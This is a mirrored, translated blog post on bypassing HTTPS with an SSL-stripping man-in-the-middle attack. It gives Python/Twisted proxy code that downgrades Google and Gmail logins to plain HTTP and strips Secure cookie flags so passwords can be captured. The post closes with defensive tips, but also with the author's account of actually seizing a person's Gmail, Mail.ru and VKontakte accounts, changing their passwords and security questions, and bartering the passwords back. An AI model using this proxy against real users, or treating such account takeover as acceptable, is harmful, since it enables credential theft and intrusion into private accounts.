<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Sandbox Wars - Part 2: HTTPS Bypass</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Previously, it was possible to intercept all the traffic of the investigated subject. However, the trite analysis of tcpdump logs does not give a mean...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Sandbox Wars - Part 2: HTTPS Bypass</h1><div class="post__text post__text-html js-mediator-article">  <a title="Part 1" href="http://habrahabr.ru/blogs/infosecurity/111489/">Previously, it</a> was possible to intercept all the traffic of the investigated subject.  However, the trite analysis of tcpdump logs does not give a meaningful result, since most services use SSL encryption to transfer important data, including passwords. <br><a name="habracut"></a><br><h3>  Secure sockets layer </h3><br><br>  SSL has been used for more than ten years, and there is plenty of information about it on the web. <br><br>  So I will only highlight the basic properties of SSL, and those who wish to implement them can learn on their own: <br><ul><li>  Authentication - the server is always authenticated, while the client is authenticated depending on the algorithm. </li><li>  Integrity - messaging includes integrity checking. </li><li>  Channel Partition - Encryption is used after the connection is established and is used for all subsequent messages. </li></ul>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      There are few options for intercepting data transferred via SSL: <br><br><h4>  Passive surveillance </h4><br><img src="https://habrastorage.org/storage/fc4472be/a893d878/d6a90dbf/42ea26fc.png"><br><br>  Not suitable, as the transmitted data is encrypted with a temporary key.  This key is known to both the client and the server, but it <em>cannot be</em> calculated only by <em>observing</em> traffic. <br>  An example of how you can implement protection against passive observation is <a href="http://ru.wikipedia.org/wiki/%25D0%2590%25D0%25BB%25D0%25B3%25D0%25BE%25D1%2580%25D0%25B8%25D1%2582%25D0%25BC_%25D0%2594%25D0%25B8%25D1%2584%25D1%2584%25D0%25B8_%25E2%2580%2594_%25D0%25A5%25D0%25B5%25D0%25BB%25D0%25BB%25D0%25BC%25D0%25B0%25D0%25BD%25D0%25B0">the Diffie-Hellman algorithm</a> . <br><br><h4>  Man in the middle </h4><br><img src="https://habrastorage.org/storage/7264026b/fd83eecf/b0c69632/dc4f5edd.png"><br><br>  If we cannot ‚Äúget into‚Äù a secure connection, then why not establish two different connections: one between the client and the attacker (which in this case pretends to be a server), and the second between the attacker and the server? <br><br>  From this Diffie-Hellman algorithm is not protected.  But SSL, in contrast to HH, requires server authentication, and therefore this approach is also doomed to failure.  When establishing a connection, the client waits for the authentication server (it is required when using SSL).  But instead of the server, it will be connected to an attacker who does not own a digital certificate corresponding to the site name. <br><br>  There are two ways to solve the problem of not having a certificate: <br><ul><li>  Create the necessary certificate yourself, and sign it yourself.  Such certificates are called ‚Äúself-signed‚Äù.  However, the digital certificate system requires the ability to verify the consistency of the certificate.  For this purpose, ‚ÄúCertification Authorities‚Äù (CA) are used, which can sign certificates of sites (and not only), as well as sign certificates of other certification centers.  Certificates of root CAs - few of them - are contributed to the browser by developers.  And the browser considers the certificate authentic only if it is located at the end of the certificate chain, starting with one of the CAs, where each next certificate is <a href="http://ru.wikipedia.org/wiki/%25D0%25AD%25D0%25BB%25D0%25B5%25D0%25BA%25D1%2582%25D1%2580%25D0%25BE%25D0%25BD%25D0%25BD%25D0%25B0%25D1%258F_%25D1%2586%25D0%25B8%25D1%2584%25D1%2580%25D0%25BE%25D0%25B2%25D0%25B0%25D1%258F_%25D0%25BF%25D0%25BE%25D0%25B4%25D0%25BF%25D0%25B8%25D1%2581%25D1%258C">signed by the</a> previous one in the chain. </li><li>  Get a certificate from a certification authority for a site, and use it to attack.  Not suitable, since in each site certificate the domain for which it was issued is indicated.  If the domain in the address bar does not match the domain specified in the certificate, the browser will start to sound the alarm. </li></ul><br><br>  In both cases, the browser will show the victim some scary picture, like this: <br><img src="https://habrastorage.org/storage/d256c087/4289cbef/cd0db7f5/35e7dd9f.png"><br><br><h3>  User Interfaces </h3><br>  Browser developers use carrots and sticks to force users to take care of their security.  The bright red picture shown above, as well as the need to press the extra button ‚ÄúContinue anyway‚Äù is a whip that encourages users to avoid sites where there is a violation of SSL. <br><br>  What is gingerbread?  The only ‚Äúencouragement‚Äù for visiting sites that correctly use SSL is green or a ‚Äúlock‚Äù picture in the address bar. <br><br>  Sites that correctly use SSL with a different class of certificates: <br><img src="https://habrastorage.org/storage/c7a2f173/3bdc780c/0e3ea405/cdad20da.png"><br><br>  Sites not using SSL: <br><img src="https://habrastorage.org/storage/4c730688/a5c4abf3/fa1d6328/9db9c685.png"><br><br>  Sites with the correct certificate, but with violations of varying degrees of severity in the use of SSL: <br><img src="https://habrastorage.org/storage/3d416061/6687dae9/a29071b0/7c6b7e18.png"><br><br>  <em>Unfortunately, the latter is found even on large sites, once again reducing the attention of users to this icon in the address bar.</em> <br><br>  From the pictures we see that the whip is used more often and by itself is more noticeable than the carrot. <br><br><h4>  findings </h4><br><ul><li>  If a user receives a message about an invalid certificate from a browser, then he will rather think whether he needs this (possibly phishing) site. </li><li>  If the user does not receive a security confirmation from the browser, then compared to the scary warnings about errors in SSL, which he often encounters on his way, he will notice the absence of some kind of green lock with a much lower probability </li></ul><br><br><h3>  How does the user use SSL? </h3><br><br>  No one types in the address bar https: // (as well as https: //). <br><br>  Users do not do anything for their own safety, but rely on the fact that the site will do it for them.  The site redirects users to SSL in four ways: <br><ul><li>  Hyperlinks </li><li>  3xx Redirect (Location: ...) </li><li>  Submit forms </li><li>  Javascript </li></ul><br><br>  This means that browsers can access https only via http. <br><br>  Can it be enough to attack http? <br><img src="https://habrastorage.org/storage/582f8cae/d967b963/f11f79fd/bde18f6e.png"><br><br><ul><li>  Monitor all http traffic </li><li>  Prevent any server attempt to redirect the user to https, replace links, Location header in redirects, etc. </li><li>  When a client makes an http request, proxy this request to the server via http or https, depending on what it was supposed to go through </li></ul><br><br>  The server does not see anything suspicious, for it the connection goes via https (however, if the server required client authentication, then nothing would work). <br><br>  The client sees that the connection goes via http, but there are no SSL errors, and, as we found out above, if the browser does not complain, the user most likely will not notice the lack of encryption. <br><br><h3>  To business </h3><br><br>  We take Python, <a href="http://twistedmatrix.com/trac/">Twisted</a> and the standard example of http-proxy: <br><br><blockquote>  <font color="#ff7700">from</font> twisted.  <font>web</font> <font color="#ff7700">import</font> proxy, http <br>  <font color="#ff7700">from</font> twisted.  <font>internet</font> <font color="#ff7700">import</font> reactor <br>  <font color="#ff7700">from</font> twisted.  <font>python</font> <font color="#ff7700">import</font> log <br>  <font color="#ff7700">import</font> <font color="#dc143c">sys</font> <br>  log.  <font>startLogging</font> <font>(</font> <font color="#dc143c">sys</font> . <font>stdout</font> <font>)</font> <br><br>  <font color="#ff7700">class</font> ProxyFactory <font>(</font> http. <font>HTTPFactory</font> <font>)</font> : <br>  protocol = proxy.  <font>Proxy</font> <br><br>  reactor.  <font>listenTCP</font> <font>(</font> <font color="#ff4500">8080</font> , ProxyFactory <font>(</font> <font>)</font> <font>)</font> <br>  reactor.  <font>run</font> <font>(</font> <font>)</font> </blockquote><br><br>  However, the default implementation does not know how to work in transparent-mode, so the code had to be a little complicated (I‚Äôll not give intermediate versions of the code, too much text will work). <br><br>  We turn on the proxy all the traffic of the victim, which was on port 80. <br><br>  Now you need to add useful functionality to the proxy.  For simplicity, we will replace in the data stream from the server to the client all occurrences of the substring https to http, without any analysis of the page code, and do it only for the domains * .google.com, gmail.com. <br><br>  In order for the server not to worry about the client connecting to it via an open channel - all connections to encrypted.google.com, gmail.com, google.com/accounts/ (and other services where https is mandatory) will be performed by the proxy over SSL. <br><br>  This is how the victim's email login page now looks like: <br><img src="https://habrastorage.org/storage/5f0bce84/cb2387cd/8072449c/a6204fbe.png"><br><br>  It can be seen that encryption is no longer working, but the browser does not issue any errors or warnings. <br><br>  In principle, this would be enough to get a password, but it will not be possible to log in and fully work through such a ‚Äúproxy‚Äù. <br><br>  The fact is that on some cookies the server can set the Secure bit, which recommends the browser to send them only over a secure channel.  In this case, the browser is connected to the proxy using the usual http, so the newly installed cookies with the Secure bit are not transmitted to the server, and it is shown the message ‚ÄúYour browser's cookies functionality is turned off.  Please turn it on. ‚Äù  But this problem is solved by simply deleting the Secure parameter from the Set-Cookie server.  Although the ability to set cookies via Javascript still complicates everything. <br><br>  The final proxy code looks like this: <br><blockquote>  <font color="#808080"># - * - coding: utf8 - * -</font> <br><br>  <font color="#ff7700">from</font> twisted.  <font>web</font> <font color="#ff7700">import</font> proxy, http <br>  <font color="#ff7700">from</font> twisted.  <font>internet</font> <font color="#ff7700">import</font> reactor, ssl <br>  <font color="#ff7700">from</font> twisted.  <font>python</font> <font color="#ff7700">import</font> log <br>  <font color="#ff7700">import</font> <font color="#dc143c">urlparse</font> <br>  <font color="#ff7700">import</font> <font color="#dc143c">sys</font> <br>  log.  <font>startLogging</font> <font>(</font> <font color="#dc143c">sys</font> . <font>stdout</font> <font>)</font> <br><br>  stripAddresses = <font color="#008000">frozenset</font> <font>(</font> <font>[</font> <font color="#483d8b">'google.com'</font> , <font color="#483d8b">'google.ru'</font> , <font color="#483d8b">'gmail.com'</font> <font>]</font> <font>)</font> <br>  forceSSLAddresses = <font color="#008000">frozenset</font> <font>(</font> <font>[</font> <font color="#483d8b">'encrypted.google.com/'</font> , <font color="#483d8b">'gmail.com/'</font> , \ <br>  <font color="#483d8b">'google.com/accounts'</font> , <font color="#483d8b">'mail.google.com/'</font> , <br>  <font color="#483d8b">'ssl.google-analytics.com/'</font> <font>]</font> <font>)</font> <br><br>  <font color="#ff7700">class</font> EvilProxyClient <font>(</font> proxy. <font>ProxyClient</font> <font>)</font> : <br><br>  <font color="#ff7700">def</font> <font color="#0000cd">__init__</font> <font>(</font> <font color="#008000">self</font> , command, rest, version, headers, data, father <font>)</font> : <br>  <font color="#808080"># Prevent any coding to make it easier to analyze content</font> <br>  headers <font>[</font> <font color="#483d8b">"accept-encoding"</font> <font>]</font> = <font color="#483d8b">"identity"</font> <br>  proxy.  <font>ProxyClient</font> .  <font color="#0000cd">__init__</font> <font>(</font> <font color="#008000">self</font> , command, rest, version, headers, data, father <font>)</font> <br><br>  <font color="#ff7700">def</font> handleHeader <font>(</font> <font color="#008000">self</font> , key, value <font>)</font> : <br>  <font color="#ff7700">if</font> key.  <font>lower</font> <font>(</font> <font>)</font> <font color="#66cc66">!</font>  = <font color="#483d8b">'content-length'</font> : <br>  proxy.  <font>ProxyClient</font> .  <font>handleHeader</font> <font>(</font> <font color="#008000">self</font> , key, value. <font>replace</font> <font>(</font> <font color="#483d8b">'https'</font> , <font color="#483d8b">'http'</font> <font>)</font> . <font>replace</font> <font>(</font> <font color="#483d8b">'ecure'</font> , <font color="#483d8b">'ecre'</font> <font>)</font> <font>)</font> <br><br>  <font color="#ff7700">def</font> handleResponsePart <font>(</font> <font color="#008000">self</font> , buffer <font>)</font> : <br>  proxy.  <font>ProxyClient</font> .  <font>handleResponsePart</font> <font>(</font> <font color="#008000">self</font> , buffer. <font>replace</font> <font>(</font> <font color="#483d8b">'https'</font> , <font color="#483d8b">'http'</font> <font>)</font> . <font>replace</font> <font>(</font> <font color="#483d8b">'ecure'</font> , <font color="#483d8b">'ecre'</font> <font>)</font> <font>)</font> <br><br>  <font color="#ff7700">class</font> EvilProxyClientFactory <font>(</font> proxy. <font>ProxyClientFactory</font> <font>)</font> : <br>  protocol = EvilProxyClient <br><br>  <font color="#ff7700">class</font> TransparentProxyRequest <font>(</font> http. <font>Request</font> <font>)</font> : <br><br>  <font color="#ff7700">def</font> <font color="#0000cd">__init__</font> <font>(</font> <font color="#008000">self</font> , channel, queued, reactor = reactor <font>)</font> : <br>  http.  <font>Request</font> .  <font color="#0000cd">__init__</font> <font>(</font> <font color="#008000">self</font> , channel, queued <font>)</font> <br>  <font color="#008000">self</font> .  <font>reactor</font> = reactor <br><br>  <font color="#ff7700">def</font> process <font>(</font> <font color="#008000">self</font> <font>)</font> : <br>  parsed = <font color="#dc143c">urlparse</font> .  <font color="#dc143c">urlparse</font> <font>(</font> <font color="#008000">self</font> . <font>uri</font> <font>)</font> <br>  headers = <font color="#008000">self</font> .  <font>getAllHeaders</font> <font>(</font> <font>)</font> .  <font color="#dc143c">copy</font> <font>(</font> <font>)</font> <br>  <font color="#ff7700">print</font> <font color="#483d8b">"Headers: <font color="#000099">\ n</font> % s"</font> <font color="#66cc66">%</font> headers <br>  host = parsed <font>[</font> <font color="#ff4500">1</font> <font>]</font> <font color="#ff7700">or</font> headers <font>[</font> <font color="#483d8b">"host"</font> <font>]</font> <br>  rest = <font color="#dc143c">urlparse</font> .  <font>urlunparse</font> <font>(</font> <font>(</font> <font color="#483d8b">''</font> , <font color="#483d8b">''</font> <font>)</font> + parsed <font>[</font> <font color="#ff4500">2</font> : <font>]</font> <font>)</font> <font color="#ff7700">or</font> <font color="#483d8b">'/'</font> <br>  <font color="#008000">self</font> .  <font>content</font> .  <font>seek</font> <font>(</font> <font color="#ff4500">0</font> , <font color="#ff4500">0</font> <font>)</font> <br>  s = <font color="#008000">self</font> .  <font>content</font> .  <font>read</font> <font>(</font> <font>)</font> <br>  <font color="#ff7700">print</font> <font color="#483d8b">"Content: <font color="#000099">\ n</font> % s"</font> <font color="#66cc66">%</font> s <br>  needStrip = <font color="#008000">filter</font> <font>(</font> <font>(</font> host + rest <font>)</font> . <font>count</font> , stripAddresses <font>)</font> <br>  clientClass = EvilProxyClientFactory <font color="#ff7700">if</font> needStrip <font color="#ff7700">else</font> proxy.  <font>ProxyClientFactory</font> <br>  clientFactory = clientClass <font>(</font> <font color="#008000">self</font> . <font>method</font> , rest, <font color="#008000">self</font> . <font>clientproto</font> , headers, <br>  s, <font color="#008000">self</font> <font>)</font> <br>  needSSL = <font color="#008000">filter</font> <font>(</font> <font>(</font> host + rest <font>)</font> . <font>count</font> , forceSSLAddresses <font>)</font> <br>  <font color="#ff7700">if</font> needSSL: <br>  <font color="#008000">self</font> .  <font>reactor</font> .  <font>connectSSL</font> <font>(</font> host, <font color="#ff4500">443</font> , clientFactory, ssl. <font>ClientContextFactory</font> <font>(</font> <font>)</font> <font>)</font> <br>  <font color="#ff7700">else</font> : <br>  <font color="#008000">self</font> .  <font>reactor</font> .  <font>connectTCP</font> <font>(</font> host, <font color="#ff4500">80</font> , clientFactory <font>)</font> <br><br>  <font color="#ff7700">class</font> TransparentProxy <font>(</font> proxy. <font>Proxy</font> <font>)</font> : <br>  requestFactory = TransparentProxyRequest <br><br>  <font color="#ff7700">class</font> TransparentProxyFactory <font>(</font> http. <font>HTTPFactory</font> <font>)</font> : <br>  protocol = TransparentProxy <br><br>  reactor.  <font>listenTCP</font> <font>(</font> <font color="#ff4500">8080</font> , TransparentProxyFactory <font>(</font> <font>)</font> <font>)</font> <br>  reactor.  <font>run</font> <font>(</font> <font>)</font> <br></blockquote><br><br>  And the fruits of his work: <br><img src="https://habrastorage.org/storage/401847cc/95eaa09b/17336ce2/4eb26bd6.png"><br><br>  Generally speaking, in theory it seems that everything is possible, but in practice there are difficulties. <br><br>  It is clear that a trivial search for all occurrences of the string ‚Äúhttps‚Äù in the data stream from the server and replacing them with ‚Äúhttp‚Äù will not give a good result, we need a deeper analysis of the page code (select the ‚Äúlink‚Äù and ‚Äúform‚Äù tags and replace the corresponding attributes - in principle, it is not difficult). <br><br>  But the addresses for the redirect, and cookies with the Secure bit can be dynamically generated in Javascript.  But this task - ‚Äúon the fly‚Äù to modify the js coming from the server so that the system behavior (up to the choice of the http / https protocol) does not change - it is not even sure that it is solvable in general. <br><br>  The third task - when receiving a request from a client, it is necessary to calculate by what protocol this request would have been if we had not interfered, and send it to the server using this protocol so that it could not notice any deviations. <br><br>  The code that you saw above, which you saw in a hurry, solves each of these problems in a very rough way, only for one site, and that is not quite correct.  This proxy comes to the google account authorization page, but after authorization, and especially when trying to access the mail interface, some jerky redirects start and may not be able to do anything at all.  However, the excuse is that the code is laid out purely for illustrative purposes.  In addition, after successfully entering the username and password, you can redirect the client to a direct connection to the server and disable the proxy. <br><br>  For Mail.ru, the situation is more favorable: the SSL connection is used only directly at the moment of transferring credentials.  That is, it is enough to modify only the action for the login form, and at the same time the user has no chance at all to notice the catch, since the login form is located on the main page of the site, which cannot be accessed via https.  Modification can be seen only by looking at the source code of the page. <br><br>  On this all the technical part.  Main material used: <a href="https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf">New Tricks For Defeating SSL In Practice</a> <br><br><h3>  findings </h3><br><ul><li>  Wherever possible, use the https-addresses immediately, do not expect a redirect </li><li>  When entering a password, make sure that the page where you enter it is SSL protected. </li><li>  Website developers: let people use SSL correctly.  Do not make the form load via http, and submit via https.  Do not use self-signed certificates.  Do not mix on the page protected and unprotected content. </li></ul><br><br><h3>  Story completion </h3><br>  And the story, begun in the <a href="http://habrahabr.ru/blogs/infosecurity/111489/">first part</a> , ended prosaically - the password from the mailbox N was extracted and changed, as well as the security question.  With the second mailbox on Mail.ru and with the account of VKontakte, the same thing was done. <br><br>  I planned to return all the passwords in a day, but the next morning I found that there was no battery in the laptop.  There was no time to understand, the train was waiting for me, so I gave passwords in exchange for my battery. </div><p>Source: <a href="https://habr.com/ru/post/111714/">https://habr.com/ru/post/111714/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../111705/index.html">Who is there about the three-dimensional porn asked?</a></li>
<li><a href="../111706/index.html">NOX Audio Android Headphones</a></li>
<li><a href="../111707/index.html">Why do you really need a brain</a></li>
<li><a href="../111710/index.html">Vimeo opens video school</a></li>
<li><a href="../111711/index.html">Soft - the struggle for survival</a></li>
<li><a href="../111715/index.html">Web development traps or web development fun</a></li>
<li><a href="../111717/index.html">A storehouse of useful information</a></li>
<li><a href="../111718/index.html">Sony sues geohot, fail0verflow and company for copyright infringement. (PS3 hacking)</a></li>
<li><a href="../111721/index.html">On the modern mobile Internet through eyewitness</a></li>
<li><a href="../111722/index.html">Unary ampersand</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>